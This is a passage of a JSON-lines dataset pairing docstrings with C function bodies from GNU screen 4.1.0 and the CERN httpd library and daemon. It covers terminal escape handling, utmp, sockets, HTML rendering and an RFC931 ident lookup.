adjust;\n        return 0;\n      }\n    }\n  }\n  return -1;\n}", "path": "screen-4.1.0\\mark.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * Do string processing. Returns -1 if output should be suspended\n * until status is gone.\n */\n", "func_signal": "static int\nStringEnd()", "code": "{\n  struct canvas *cv;\n  char *p;\n  int typ;\n\n  curr->w_state = LIT;\n  *curr->w_stringp = '\\0';\n  switch (curr->w_StringType)\n    {\n    case OSC:\t/* special xterm compatibility hack */\n      if (curr->w_string[0] == ';' || (p = index(curr->w_string, ';')) == 0)\n\tbreak;\n      typ = atoi(curr->w_string);\n      p++;\n#ifdef MULTIUSER\n      if (typ == 83)\t/* 83 = 'S' */\n\t{\n\t  /* special execute commands sequence */\n\t  char *args[MAXARGS];\n\t  int argl[MAXARGS];\n\t  struct acluser *windowuser;\n\n\t  windowuser = *FindUserPtr(\":window:\");\n\t  if (windowuser && Parse(p, sizeof(curr->w_string) - (p - curr->w_string), args, argl))\n\t    {\n\t      for (display = displays; display; display = display->d_next)\n\t\tif (D_forecv->c_layer->l_bottom == &curr->w_layer)\n\t\t  break;\t/* found it */\n\t      if (display == 0 && curr->w_layer.l_cvlist)\n\t\tdisplay = curr->w_layer.l_cvlist->c_display;\n\t      if (display == 0)\n\t\tdisplay = displays;\n\t      EffectiveAclUser = windowuser;\n\t      fore = curr;\n\t      flayer = fore->w_savelayer ? fore->w_savelayer : &fore->w_layer;\n\t      DoCommand(args, argl);\n\t      EffectiveAclUser = 0;\n\t      fore = 0;\n\t      flayer = 0;\n\t    }\n\t  break;\n\t}\n#endif\n#ifdef RXVT_OSC\n      if (typ == 0 || typ == 1 || typ == 2 || typ == 20 || typ == 39 || typ == 49)\n\t{\n\t  int typ2;\n\t  typ2 = typ / 10;\n\t  if (--typ2 < 0)\n\t    typ2 = 0;\n\t  if (strcmp(curr->w_xtermosc[typ2], p))\n\t    {\n\t      strncpy(curr->w_xtermosc[typ2], p, sizeof(curr->w_xtermosc[typ2]) - 1);\n\t      curr->w_xtermosc[typ2][sizeof(curr->w_xtermosc[typ2]) - 1] = 0;\n\n\t      for (display = displays; display; display = display->d_next)\n\t\t{\n\t\t  if (!D_CXT)\n\t\t    continue;\n\t\t  if (D_forecv->c_layer->l_bottom == &curr->w_layer)\n\t\t    SetXtermOSC(typ2, curr->w_xtermosc[typ2]);\n\t\t  if ((typ2 == 2 || typ2 == 3) && D_xtermosc[typ2])\n\t\t    Redisplay(0);\n\t\t}\n\t    }\n\t}\n      if (typ != 0 && typ != 2)\n\tbreak;\n#else\n      if (typ < 0 || typ > 2)\n\tbreak;\n#endif\n      \n      curr->w_stringp -= p - curr->w_string;\n      if (curr->w_stringp > curr->w_string)\n\tbcopy(p, curr->w_string, curr->w_stringp - curr->w_string);\n      *curr->w_stringp = '\\0';\n      /* FALLTHROUGH */\n    case APC:\n      if (curr->w_hstatus)\n\t{\n\t  if (strcmp(curr->w_hstatus, curr->w_string) == 0)\n\t    break;\t/* not changed */\n\t  free(curr->w_hstatus);\n\t  curr->w_hstatus = 0;\n\t}\n      if (curr->w_string != curr->w_stringp)\n\tcurr->w_hstatus = SaveStr(curr->w_string);\n      WindowChanged(curr, 'h');\n      break;\n    case PM:\n    case GM:\n      for (display = displays; display; display = display->d_next)\n\t{\n\t  for (cv = D_cvlist; cv; cv = cv->c_next)\n\t    if (cv->c_layer->l_bottom == &curr->w_layer)\n\t      break;\n\t  if (cv || curr->w_StringType == GM)\n\t    MakeStatus(curr->w_string);\n\t}\n      return -1;\n    case DCS:\n      LAY_DISPLAYS(&curr->w_layer, AddStr(curr->w_string));\n      break;\n    case AKA:\n      if (curr->w_title == curr->w_akabuf && !*curr->w_string)\n\tbreak;\n      ChangeAKA(curr, curr->w_string, strlen(curr->w_string));\n      if (!*curr->w_string)\n\tcurr->w_autoaka = curr->w_y + 1;\n      break;\n    default:\n      break;\n    }\n  return 0;\n}", "path": "screen-4.1.0\\ansi.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * the utmp entry for tty is located and removed.\n * it is stored in D_utmp_logintty.\n */\n", "func_signal": "void\nRemoveLoginSlot()", "code": "{\n  struct utmp u, *uu;\n\n  ASSERT(display);\n  debug(\"RemoveLoginSlot: removing your logintty\\n\");\n  D_loginslot = TtyNameSlot(D_usertty);\n  if (D_loginslot == (slot_t)0 || D_loginslot == (slot_t)-1)\n    return;\n#ifdef UTMP_HELPER\n  if (eff_uid)\t/* helpers can't do login slots. sigh. */\n#else\n  if (!utmpok)\n#endif\n    {\n      D_loginslot = 0;\n      debug(\"RemoveLoginSlot: utmpok == 0\\n\");\n    }\n  else\n    {\n#ifdef _SEQUENT_\n      {\n\tchar *p;\n\tif ((p = ut_find_host(D_loginslot)) != 0)\n\t  strncpy(D_loginhost, p, sizeof(D_loginhost) - 1);\n\tD_loginhost[sizeof(D_loginhost) - 1] = 0;\n      }\n#endif /* _SEQUENT_ */\n\n      if ((uu = getutslot(D_loginslot)) == 0)\n\t{\n\t  debug(\"Utmp slot not found -> not removed\");\n\t  D_loginslot = 0;\n\t}\n      else\n\t{\n\t  D_utmp_logintty = *uu;\n\t  u = *uu;\n\t  makedead(&u);\n\t  if (pututslot(D_loginslot, &u, (char *)0, (struct win *)0) == 0)\n\t    D_loginslot = 0;\n\t}\n      UT_CLOSE;\n    }\n  debug1(\" slot %d zapped\\n\", (int)D_loginslot);\n  if (D_loginslot == (slot_t)0)\n    {\n      /* couldn't remove slot, do a 'mesg n' at least. */\n      struct stat stb;\n      char *tty;\n      debug(\"couln't zap slot -> do mesg n\\n\");\n      D_loginttymode = 0;\n      if ((tty = ttyname(D_userfd)) && stat(tty, &stb) == 0 && (int)stb.st_uid == real_uid && ((int)stb.st_mode & 0777) != 0666)\n\t{\n\t  D_loginttymode = (int)stb.st_mode & 0777;\n\t  chmod(D_usertty, stb.st_mode & 0600);\n\t}\n    }\n}", "path": "screen-4.1.0\\utmp.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/** Returns non-zero on success. */\n", "func_signal": "struct ListData *\nglist_display(struct GenericList *list, const char *name)", "code": "{\n  struct ListData *ldata;\n\n  if (InitOverlayPage(sizeof(struct ListData), &ListLf, 0))\n    return NULL;\n  ldata = flayer->l_data;\n\n  ldata->name = name;\t/* We do not SaveStr, since the strings should be all static literals */\n  ldata->list_fn = list;\n\n  flayer->l_mode = 1;\n  flayer->l_x = 0;\n  flayer->l_y = flayer->l_height - 1;\n\n  return ldata;\n}", "path": "screen-4.1.0\\list_generic.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* NAMEDPIPE */\n", "func_signal": "int\nMakeServerSocket()", "code": "{\n  register int s;\n  struct sockaddr_un a;\n  struct stat st;\n\n  if ((s = socket(AF_UNIX, SOCK_STREAM, 0)) == -1)\n    Panic(errno, \"socket\");\n  a.sun_family = AF_UNIX;\n  strncpy(a.sun_path, SockPath, sizeof(a.sun_path));\n  a.sun_path[sizeof(a.sun_path) - 1] = 0;\n# ifdef USE_SETEUID\n  xseteuid(real_uid);\n  xsetegid(real_gid);\n# endif\n  if (connect(s, (struct sockaddr *) &a, strlen(SockPath) + 2) != -1)\n    {\n      debug(\"oooooh! socket already is alive!\\n\");\n      if (quietflag)\n\t{ \n\t  Kill(D_userpid, SIG_BYE);\n\t  /* \n\t   * oh, well. nobody receives that return code. papa \n\t   * dies by signal.\n\t   */\n\t  eexit(11);\n\t}\n      Msg(0, \"There is already a screen running on %s.\", Filename(SockPath));\n      if (stat(SockPath, &st) == -1)\n\tPanic(errno, \"stat\");\n      if (st.st_uid != real_uid)\n\tPanic(0, \"Unfortunately you are not its owner.\");\n      if ((st.st_mode & 0700) == 0600)\n\tPanic(0, \"To resume it, use \\\"screen -r\\\"\");\n      else\n\tPanic(0, \"It is not detached.\");\n      /* NOTREACHED */\n    }\n#if defined(m88k) || defined(sysV68)\n  close(s);\t/* we get bind: Invalid argument if this is not done */\n  if ((s = socket(AF_UNIX, SOCK_STREAM, 0)) == -1)\n    Panic(errno, \"reopen socket\");\n#endif\n  (void) unlink(SockPath);\n  if (bind(s, (struct sockaddr *) & a, strlen(SockPath) + 2) == -1)\n    Panic(errno, \"bind (%s)\", SockPath);\n#ifdef SOCK_NOT_IN_FS\n    {\n      int f;\n      if ((f = secopen(SockPath, O_RDWR | O_CREAT, SOCKMODE)) < 0)\n        Panic(errno, \"shadow socket open\");\n      close(f);\n    }\n#else\n  chmod(SockPath, SOCKMODE);\n# ifndef USE_SETEUID\n  chown(SockPath, real_uid, real_gid);\n# endif\n#endif /* SOCK_NOT_IN_FS */\n  if (listen(s, 5) == -1)\n    Panic(errno, \"listen\");\n# ifdef F_SETOWN\n  fcntl(s, F_SETOWN, getpid());\n  debug1(\"Serversocket owned by %d\\n\", fcntl(s, F_GETOWN, 0));\n# endif /* F_SETOWN */\n# ifdef USE_SETEUID\n  xseteuid(eff_uid);\n  xsetegid(eff_gid);\n# endif\n  return s;\n}", "path": "screen-4.1.0\\socket.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* auxiliary function for binary search in interval table */\n", "func_signal": "static int bisearch(int ucs, const struct interval *table, int max)", "code": "{\n  int min = 0;\n  int mid;\n\n  if (ucs < table[0].first || ucs > table[max].last)\n    return 0;\n  while (max >= min) {\n    mid = (min + max) / 2;\n    if (ucs > table[mid].last)\n      min = mid + 1;\n    else if (ucs < table[mid].first)\n      max = mid - 1;\n    else\n      return 1;\n  }\n\n  return 0;\n}", "path": "screen-4.1.0\\encoding.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* Remove the status but make sure that it is seen for MsgMinWait ms */\n", "func_signal": "static void\nRemoveStatusMinWait()", "code": "{\n  /* XXX: should flush output first if D_status_obufpos is set */\n  if (!D_status_bell && !D_status_obufpos)\n    {\n      struct timeval now;\n      int ti;\n      gettimeofday(&now, NULL);\n      ti = (now.tv_sec - D_status_time.tv_sec) * 1000 + (now.tv_usec - D_status_time.tv_usec) / 1000;\n      if (ti < MsgMinWait)\n\tDisplaySleep1000(MsgMinWait - ti, 0);\n    }\n  RemoveStatus();\n}", "path": "screen-4.1.0\\display.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* Pointer to translation */\n", "func_signal": "PUBLIC void HTMLUseCharacterSet ARGS1(HTMLCharacterSet, i)", "code": "{\n    p_entity_values = (i == HTML_NEXT_CHARS) ? NeXTCharacters\n    \t\t\t\t\t     : ISO_Latin1;\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\t\tNew Structured Text object\n**\t\t--------------------------\n**\n**\tThe structured stream can generate either presentation,\n**\tor plain text, or HTML.\n*/\n", "func_signal": "PUBLIC HTStructured* HTML_new ARGS5(\n\tHTRequest *,\t\trequest,\n\tvoid *,\t\t\tparam,\n\tHTFormat,\t\tinput_format,\n\tHTFormat,\t\toutput_format,\n\tHTStream *,\t\toutput_stream)", "code": "{\n\n    HTStructured * me;\n    \n    if (output_format != WWW_PLAINTEXT\n    \t&& output_format != WWW_PRESENT\n\t&& output_format != HTAtom_for(\"text/x-c\")) {\n        HTStream * intermediate = HTStreamStack(WWW_HTML, request, NO);\n\tif (intermediate) return HTMLGenerator(intermediate);\n        fprintf(stderr, \"** Internal error: can't parse HTML to %s\\n\",\n       \t\tHTAtom_name(output_format));\n\texit (-99);\n    }\n\n    me = (HTStructured*) malloc(sizeof(*me));\n    if (me == NULL) outofmem(__FILE__, \"HTML_new\");\n\n    if (!got_styles) get_styles();\n\n    me->isa = &HTMLPresentation;\n    me->dtd = &DTD;\n    me->node_anchor =  request->anchor;\n    me->title.size = 0;\n    me->title.growby = 128;\n    me->title.allocated = 0;\n    me->title.data = 0;\n    me->text = 0;\n    me->style_change = YES; /* Force check leading to text creation */\n    me->new_style = default_style;\n    me->old_style = 0;\n    me->sp = me->stack + MAX_NESTING - 1;\n    me->sp->tag_number = -1;\t\t\t\t/* INVALID */\n    me->sp->style = default_style;\t\t\t/* INVALID */\n    \n    me->comment_start = NULL;\n    me->comment_end = NULL;\n    me->target = output_stream;\n    if (output_stream) me->targetClass = *output_stream->isa;\t/* Copy pointers */\n    \n    return (HTStructured*) me;\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\t\tIf style really needs to be set, call this\n*/\n", "func_signal": "PRIVATE void actually_set_style ARGS1(HTStructured *, me)", "code": "{\n    if (!me->text) {\t\t\t/* First time through */\n\t    me->text = HText_new2(me->node_anchor, me->target);\n\t    HText_beginAppend(me->text);\n\t    HText_setStyle(me->text, me->new_style);\n\t    me->in_word = NO;\n    } else {\n\t    HText_setStyle(me->text, me->new_style);\n    }\n    me->old_style = me->new_style;\n    me->style_change = NO;\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* PUBLIC\t\t\t\t\tHTAA_setDefaultProtection()\n**\t\tSET THE DEFAULT PROTECTION MODE\n**\t\t(called by rule system when a\n**\t\t\"defprot\" rule is matched)\n** ON ENTRY:\n**\treq\t\trequest structure.\n**\tprot_filename\tis the protection setup file (second argument\n**\t\t\tfor \"defprot\" rule, optional)\n**\tids\t\tcontains user and group names separated by\n**\t\t\ta dot, corresponding to the uid\n**\t\t\tgid under which the server should run,\n**\t\t\tdefault is \"nobody.nogroup\" (third argument\n**\t\t\tfor \"defprot\" rule, optional; can be given\n**\t\t\tonly if protection setup file is also given).\n**\n** ON EXIT:\n**\treturns\t\tnothing.\n**\t\t\tSets default protection mode of the request.\n*/\n", "func_signal": "PUBLIC void HTAA_setDefaultProtection ARGS3(HTRequest *,\treq,\n\t\t\t\t\t    CONST char *,\tprot_filename,\n\t\t\t\t\t    HTUidGid *,\t\tids)", "code": "{\n    if (!req) {\n\tCTRACE(stderr,\n\t       \"INTERNAL.... req == NULL! [HTAA_setDefaultProtection()]\\n\");\n\treturn;\n    }\n\n    HTDefProt = NULL;\t/* Not free()'d because this is in cache */\n\n    if (prot_filename) {\n\tHTDefProt = HTAAProt_new(prot_filename, ids);\n    } else {\n\tHTLog_error(\"Protection file not given [obligatory for DefProt rule]\");\n    }\n}", "path": "Daemon\\Implementation\\HTAAProt.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\tBuffer write\n**\t------------\n*/\n", "func_signal": "PRIVATE void HTML_write ARGS3(HTStructured *, me, CONST char*, s, int, l)", "code": "{\n    CONST char* p;\n    CONST char* e = s+l;\n    for (p=s; s<e; p++) HTML_put_character(me, *p);\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* Current uid and gid\t    */\n", "func_signal": "PUBLIC HTUidGid * HTUidGid_new ARGS2(char *, u,\n\t\t\t\t     char *, g)", "code": "{\n    HTUidGid * ug;\n\n    if (!u && !g) return NULL;\n\n    ug = (HTUidGid*)calloc(1,sizeof(HTUidGid));\n    if (!ug) outofmem(__FILE__, \"HTUidGid_new\");\n\n    if (!g) {\n\tg = strchr(u,'.');\n\tif (g) *g++ = 0;\n    }\n\n    if (u && *u) {\n\tif (HTIsNumber(u))\n\t    ug->uid = atoi(u);\n\telse\n\t    StrAllocCopy(ug->uname,u);\n    }\n\n    if (g && *g) {\n\tif (HTIsNumber(g))\n\t    ug->gid = atoi(g);\n\telse\n\t    StrAllocCopy(ug->gname,g);\n    }\n\n    CTRACE(stderr,\n    \"Parsed...... strings %s and %s as uname:%s uid:%d gname:%s gid:%d\\n\",\n\t   u ? u : \"-null-\", g ? g : \"-null-\",\n\t   ug->uname ? ug->uname : \"-null-\", ug->uid,\n\t   ug->gname ? ug->gname : \"-null-\", ug->gid);\n\n    return ug;\n}", "path": "Daemon\\Implementation\\HTAAProt.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\tHTConverter for HTML to C code\n**\t------------------------------\n**\n**\tC code is like plain text but all non-preformatted code\n**\tis commented out.\n**\tThis will convert from HTML to presentation or plain text.\n*/\n", "func_signal": "PUBLIC HTStream* HTMLToC ARGS5(\n\tHTRequest *,\t\trequest,\n\tvoid *,\t\t\tparam,\n\tHTFormat,\t\tinput_format,\n\tHTFormat,\t\toutput_format,\n\tHTStream *,\t\toutput_stream)", "code": "{\n    \n    HTStructured * html;\n    \n    (*output_stream->isa->put_string)(output_stream, \"/* \"); /* Before title */\n    html = HTML_new(request, NULL, input_format, output_format, output_stream);\n    html->comment_start = \"/* \";\n    html->dtd = &DTD;\n    html->comment_end = \" */\\n\";\t/* Must start in col 1 for cpp */\n    return SGML_new(&DTD, html);\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*      If you THINK you need to change style, call this\n*/\n", "func_signal": "PRIVATE void change_paragraph_style ARGS2(HTStructured *, me, HTStyle *,style)", "code": "{\n    if (me->new_style!=style) {\n    \tme->style_change = YES;\n\tme->new_style = style;\n    }\n    me->in_word = NO;\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* rfc931 - return remote user name, given socket structures */\n", "func_signal": "PUBLIC char * rfc931 ARGS2(struct sockaddr_in *,\trmt_sin,\n\t\t\t   struct sockaddr_in *,\tour_sin)", "code": "{\n    unsigned rmt_port;\n    unsigned our_port;\n    struct sockaddr_in rmt_query_sin;\n    struct sockaddr_in our_query_sin;\n    static char user[256];\t\t/* XXX */\n    char    buffer[512];\t\t/* XXX */\n    char   *cp;\n    char   *result = FROM_UNKNOWN;\t/* XXX */\n    FILE   *fp;\n\n    CTRACE(stderr, \"RFC931...... Getting remote ident\\n\");\n\n    /*\n     * Use one unbuffered stdio stream for writing to and for reading from\n     * the RFC931 etc. server. This is done because of a bug in the SunOS\n     * 4.1.x stdio library. The bug may live in other stdio implementations,\n     * too. When we use a single, buffered, bidirectional stdio stream (\"r+\"\n     * or \"w+\" mode) we read our own output. Such behaviour would make sense\n     * with resources that support random-access operations, but not with\n     * sockets.\n     */\n\n    if ((fp = fsocket(AF_INET, SOCK_STREAM, 0)) != 0) {\n\tsetbuf(fp, (char *) 0);\n\n\t/*\n\t * Set up a timer so we won't get stuck while waiting for the server.\n\t */\n\n\tif (setjmp(timebuf) == 0) {\n\t    signal(SIGALRM, timeout);\n\t    alarm(rfc931_timeout);\n\n\t    /*\n\t     * Bind the local and remote ends of the query socket to the same\n\t     * IP addresses as the connection under investigation. We go\n\t     * through all this trouble because the local or remote system\n\t     * might have more than one network address. The RFC931 etc.\n\t     * client sends only port numbers; the server takes the IP\n\t     * addresses from the query socket.\n\t     */\n\n\t    our_query_sin = *our_sin;\n\t    our_query_sin.sin_port = htons(ANY_PORT);\n\t    rmt_query_sin = *rmt_sin;\n\t    rmt_query_sin.sin_port = htons(RFC931_PORT);\n\n\t    if (bind_connect(fileno(fp),\n\t\t\t     (struct sockaddr *) & our_query_sin,\n\t\t\t     (struct sockaddr *) & rmt_query_sin,\n\t\t\t     sizeof(our_query_sin)) >= 0) {\n\n\t\t/*\n\t\t * Send query to server. Neglect the risk that a 13-byte\n\t\t * write would have to be fragmented by the local system and\n\t\t * cause trouble with buggy System V stdio libraries.\n\t\t */\n\t\tCTRACE(stderr,\"RFC931...... connected, sending ident request\\n\");\n\t\tfprintf(fp, \"%u,%u\\r\\n\",\n\t\t\tntohs(rmt_sin->sin_port),\n\t\t\tntohs(our_sin->sin_port));\n\t\tfflush(fp);\n\n\t\t/*\n\t\t * Read response from server. Use fgets()/sscanf() so we can\n\t\t * work around System V stdio libraries that incorrectly\n\t\t * assume EOF when a read from a socket returns less than\n\t\t * requested.\n\t\t */\n\t\tCTRACE(stderr,\"RFC931...... reading response from identd\\n\");\n\t\tif (fgets(buffer, sizeof(buffer), fp) != 0\n\t\t    && ferror(fp) == 0 && feof(fp) == 0\n\t\t    && sscanf(buffer, \"%u , %u : USERID :%*[^:]:%255s\",\n\t\t\t      &rmt_port, &our_port, user) == 3\n\t\t    && ntohs(rmt_sin->sin_port) == rmt_port\n\t\t    && ntohs(our_sin->sin_port) == our_port) {\n\n\t\t    /*\n\t\t     * Strip trailing carriage return. It is part of the\n\t\t     * protocol, not part of the data.\n\t\t     */\n\n\t\t    if ((cp = strchr(user, '\\r')))\n\t\t\t*cp = 0;\n\t\t    result = user;\n\t\t}\n\n\t    }\n\t    else {\n\t\tCTRACE(stderr, \"RFC931...... connect() failed: %s\\n\",\n\t\t       HTErrnoString());\n\t    }\n\t    alarm(0);\n\t}\n\tfclose(fp);\n    }\n\n    CTRACE(stderr,\"RFC931...... Remote ident: %s\\n\", result ?result :\"-none-\");\n    return (result);\n}", "path": "Daemon\\Implementation\\HTRFC931.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* fsocket - open stdio stream on top of socket */\n", "func_signal": "PRIVATE FILE *fsocket ARGS3(int,\tdomain,\n\t\t\t    int,\ttype,\n\t\t\t    int,\tprotocol)", "code": "{\n    int     s;\n    FILE   *fp;\n\n    if ((s = socket(domain, type, protocol)) < 0) {\n\tHTLog_error2(\"RFC931: socket() failed:\",HTErrnoString());\n#if 0\n\tsyslog(LOG_ERR, \"socket: %m\");\n#endif\n\treturn (0);\n    } else {\n\tif ((fp = fdopen(s, \"r+\")) == 0) {\n\t    HTLog_error2(\"RFC931: fdopen() failed:\",HTErrnoString());\n#if 0\n\t    syslog(LOG_ERR, \"fdopen: %m\");\n#endif\n\t    close(s);\n\t}\n\treturn (fp);\n    }\n}", "path": "Daemon\\Implementation\\HTRFC931.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\t\tEnd Element\n**\t\t-----------\n**\n*/\n/*\tWhen we end an element, the style must be returned to that\n**\tin effect before that element.  Note that anchors (etc?)\n**\tdon't have an associated style, so that we must scan down the\n**\tstack for an element with a defined style. (In fact, the styles\n**\tshould be linked to the whole stack not just the top one.)\n**\tTBL 921119\n**\n**\tWe don't turn on \"CAREFUL\" check because the parser produces\n**\t(internal code errors apart) good nesting. The parser checks\n**\tincoming code errors, not this module.\n*/\n", "func_signal": "PRIVATE void HTML_end_element ARGS2(HTStructured *, me, int , element_number)", "code": "{\n#ifdef CAREFUL\t\t\t/* parser assumed to produce good nesting */\n    if (element_number != me->sp[0].tag_number) {\n        fprintf(stderr, \"HTMLText: end of element %s when expecting end of %s\\n\",\n\t\tme->dtd->tags[element_number].name,\n\t\tme->dtd->tags[me->sp->tag_number].name);\n\t\t/* panic */\n    }\n#endif\n    \n    me->sp++;\t\t\t\t/* Pop state off stack */\n    \n    switch(element_number) {\n\n    case HTML_A:\n\tUPDATE_STYLE;\n\tHText_endAnchor(me->text);\n\tbreak;\n\n    case HTML_TITLE:\n        HTChunkTerminate(&me->title);\n    \tHTAnchor_setTitle(me->node_anchor, me->title.data);\n\tbreak;\n\t\n    case HTML_LISTING:\t\t\t\t/* Litteral text */\n    case HTML_XMP:\n    case HTML_PLAINTEXT:\n    case HTML_PRE:\n    \tif (me->comment_start)\n    \t    HText_appendText(me->text, me->comment_start);\n\t/* Fall through */\n\t\n    default:\n    \n\tchange_paragraph_style(me, me->sp->style);\t/* Often won't really change */\n\tbreak;\n\t\n    } /* switch */\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\tStart Element\n**\t-------------\n*/\n", "func_signal": "PRIVATE void HTML_start_element ARGS4(\n\tHTStructured *, \tme,\n\tint,\t\t\telement_number,\n\tCONST BOOL*,\t \tpresent,\n\tCONST char **,\t\tvalue)", "code": "{\n    switch (element_number) {\n    case HTML_A:\n\t{\n\t    HTChildAnchor * source;\n\t    char * href = NULL;\n\t    if (present[HTML_A_HREF]) {\n\t    \tStrAllocCopy(href, value[HTML_A_HREF]);\n#ifdef OLD_CODE\n\t\tHTSimplify(href);\n#endif\n\t    }\n\t    source = HTAnchor_findChildAndLink(\n\t\tme->node_anchor,\t\t\t\t/* parent */\n\t\tpresent[HTML_A_NAME] ? value[HTML_A_NAME] : 0,\t/* Tag */\n\t\tpresent[HTML_A_HREF] ? href : 0,\t\t/* Addresss */\n\t\tpresent[HTML_A_REL] && value[HTML_A_REL] ? \n\t\t\t(HTLinkType*)HTAtom_for(value[HTML_A_REL])\n\t\t\t    \t\t\t: 0);\n\t    \n\t    if (present[HTML_A_TITLE] && value[HTML_A_TITLE]) {\n\t        HTParentAnchor * dest = \n\t\t    HTAnchor_parent(\n\t\t\tHTAnchor_followMainLink((HTAnchor*)source)\n\t\t\t\t    );\n\t\tif (!HTAnchor_title(dest))\n\t\t\tHTAnchor_setTitle(dest, value[HTML_A_TITLE]);\n\t    }\n\t    UPDATE_STYLE;\n\t    HText_beginAnchor(me->text, source);\n\t    free(href);\t\t\t/* Leak fix Henrik 17/02-94 */\n\t}\n    \tbreak;\n\t\n    case HTML_TITLE:\n        HTChunkClear(&me->title);\n\tbreak;\n\t\n    case HTML_NEXTID:\n    \t/* if (present[NEXTID_N] && value[NEXTID_N])\n\t\tHText_setNextId(me->text, atoi(value[NEXTID_N])); */\n    \tbreak;\n\t\n    case HTML_ISINDEX:\n   \tHTAnchor_setIndex(me->node_anchor);\n\tbreak;\n\t\n    case HTML_BR: \n\tUPDATE_STYLE;\n\tHText_appendCharacter(me->text, '\\n');\n\tme->in_word = NO;\n\tbreak;\n\t\n    case HTML_HR: \n\tUPDATE_STYLE;\n\tHText_appendCharacter(me->text, '\\n');\n\tHText_appendText(me->text, \"___________________________________\");\n\tHText_appendCharacter(me->text, '\\n');\n\tme->in_word = NO;\n\tbreak;\n\t\n    case HTML_P:\n\tUPDATE_STYLE;\n\tHText_appendParagraph(me->text);\n\tme->in_word = NO;\n\tbreak;\n\n    case HTML_DL:\n        change_paragraph_style(me, present && present[DL_COMPACT]\n    \t\t? styles[HTML_DL]\n\t\t: styles[HTML_DL]);\n\tbreak;\n\t\n    case HTML_DT:\n        if (!me->style_change) {\n\t    HText_appendParagraph(me->text);\n\t    me->in_word = NO;\n\t}\n\tbreak;\n\t\n    case HTML_DD:\n        UPDATE_STYLE;\n\tHTML_put_character(me, '\\t');\t/* Just tab out one stop */\n\tme->in_word = NO;\n\tbreak;\n\n    case HTML_UL:\n    case HTML_OL:\n    case HTML_MENU:\n    case HTML_DIR:\n\tchange_paragraph_style(me, styles[element_number]);\n\tbreak;\n\t\n    case HTML_LI:\n        UPDATE_STYLE;\n\tif (me->sp[0].tag_number != HTML_DIR)\n\t    HText_appendParagraph(me->text);\n\telse\n\t    HText_appendCharacter(me->text, '\\t');\t/* Tab @@ nl for UL? */\n\tme->in_word = NO;\n\tbreak;\n\t\n    case HTML_LISTING:\t\t\t\t/* Litteral text */\n    case HTML_XMP:\n    case HTML_PLAINTEXT:\n    case HTML_PRE:\n\tchange_paragraph_style(me, styles[element_number]);\n\tUPDATE_STYLE;\n    \tif (me->comment_end)\n    \t    HText_appendText(me->text, me->comment_end);\n\tbreak;\n\n    case HTML_IMG:\t\t\t/* Images */\n\t{\n\t    HTChildAnchor *source;\n\t    char *src = NULL;\n\t    if (present[HTML_IMG_SRC]) {\n\t\tStrAllocCopy(src, value[HTML_IMG_SRC]);\n#ifdef OLD_CODE\n\t\tHTSimplify(src);\n#endif\n\t    }\n\t    source = HTAnchor_findChildAndLink(\n\t\t\t\t\t       me->node_anchor,\t   /* parent */\n\t\t\t\t\t       0,                     /* Tag */\n\t\t\t\t\t       src ? src : 0,    /* Addresss */\n\t\t\t\t\t       0);\n\t    UPDATE_STYLE;\n\t    HText_appendImage(me->text, source,\n\t\t      present[HTML_IMG_ALT] ? value[HTML_IMG_ALT] : NULL,\n\t\t      present[HTML_IMG_ALIGN] ? value[HTML_IMG_ALIGN] : NULL,\n\t\t      present[HTML_IMG_ISMAP] ? YES : NO);\n\t    free(src);\n\t}\t\n\tbreak;\n\n    case HTML_HTML:\t\t\t/* Ignore these altogether */\n    case HTML_HEAD:\n    case HTML_BODY:\n    \n    case HTML_TT:\t\t\t/* Physical character highlighting */\n    case HTML_B:\t\t\t/* Currently ignored */\n    case HTML_I:\n    case HTML_U:\n    \n    case HTML_EM:\t\t\t/* Logical character highlighting */\n    case HTML_STRONG:\t\t\t/* Currently ignored */\n    case HTML_CODE:\n    case HTML_SAMP:\n    case HTML_KBD:\n    case HTML_VAR:\n    case HTML_DFN:\n    case HTML_CITE:\n    \tbreak;\n\t\n    case HTML_H1:\t\t\t/* paragraph styles */\n    case HTML_H2:\n    case HTML_H3:\n    case HTML_H4:\n    case HTML_H5:\n    case HTML_H6:\n    case HTML_H7:\n    case HTML_ADDRESS:\n    case HTML_BLOCKQUOTE:\n    \tchange_paragraph_style(me, styles[element_number]);\t/* May be postponed */\n\tbreak;\n\n    } /* end switch */\n\n    if (me->dtd->tags[element_number].contents!= SGML_EMPTY) {\n        if (me->sp == me->stack) {\n\t    fprintf(stderr, \"HTML: ****** Maximum nesting of %d exceded!\\n\",\n\t    